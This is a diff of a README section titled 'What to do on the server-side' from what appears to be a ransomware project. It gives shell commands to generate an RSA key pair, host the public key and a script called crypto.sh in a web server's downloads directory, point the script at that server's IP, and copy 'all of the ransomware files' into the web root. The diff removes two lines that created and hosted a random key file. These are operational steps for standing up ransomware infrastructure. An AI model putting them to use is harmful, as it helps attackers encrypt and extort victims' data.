@@ -9,10 +9,8 @@
 ## What to do on the server-side
  - $ openssl genrsa -out priv.pem 4096
  - $ openssl rsa -pubout -in priv.pem -out pub.pem
- - $ cat /dev/urandom | tr -cd 'A-Za-z0-9' | fold -w 4096 | head -n 1 > key.bin
  - $ mkdir -p /var/www/html/downloads
  - $ cp pub.pem /var/www/html/downloads/
- - $ cp key.bin /var/www/html/downloads/
  - > Modify crypto.sh and replace the IPwith your web server's IP/URL
  - $ cp crypto.sh /var/www/html/downloads/
  - > Copy all of the ransomware files to /var/www/html
